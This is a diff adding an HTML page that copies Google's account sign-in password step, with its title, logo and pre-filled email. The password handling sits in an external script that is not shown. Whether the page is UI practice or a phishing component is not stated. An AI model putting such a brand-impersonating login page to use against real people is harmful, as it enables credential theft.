@@ -1,0 +1,38 @@
+<html>
+    <head>
+        <link type="text/css" rel="stylesheet" href="/css/login_pass_style.css">
+        <script type="text/javascript" src="/js/pass_response.js"></script>
+        <link type="image/x-con" rel="icon" href="/media/title_img.png">
+        <title>Sign in-Google Accounts</title>
+    </head>
+    <body>
+        <div id="main">
+            <img id="google_image" src="/media/google.png">
+            <h1 id="heading"></h1>
+            <select  id="email">
+                <option></option>
+            </select>
+            <div id="input_area">
+                <input type="password" id="password_field" placeholder="Enter your password">  
+                <img id="toggle_image" src="/media/hide_password.png" onclick="toggle()">   
+            </div>
+            <div id="foot">
+                <div id="forgot">
+                    <p>Forgot password?</p>
+                </div>
+                <div id="next_button">
+                    <button onclick="next_press()">Next</button>
+                </div>
+            </div>
+        </div>
+    <script>
+        document.getElementById("heading").innerHTML = "Hi " + localStorage.getItem("name");
+        document.getElementById("email").firstElementChild.innerHTML = localStorage.getItem("email")+"@gmail.com";
+        document.getElementById("password_field").addEventListener("keyup",function(event){
+            if(event.keyCode === 13){
+                next_press();
+            }
+        })
+    </script>
+    </body>
+</html>
